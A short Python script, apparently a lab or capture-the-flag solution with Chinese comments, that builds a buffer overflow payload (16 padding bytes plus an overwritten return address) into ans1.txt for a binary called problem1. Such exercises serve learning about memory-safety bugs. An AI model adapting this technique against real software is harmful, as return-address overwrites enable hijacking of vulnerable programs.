import sys

# 构造 Padding

padding = b'A' * 16

#  构造目标地址
target_addr = b'\x16\x12\x40\x00\x00\x00\x00\x00'

#组合 Payload
payload = padding + target_addr

# 写入文件
print(f"Generating payload with length: {len(payload)}")
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Done! Run: ./problem1 ans1.txt")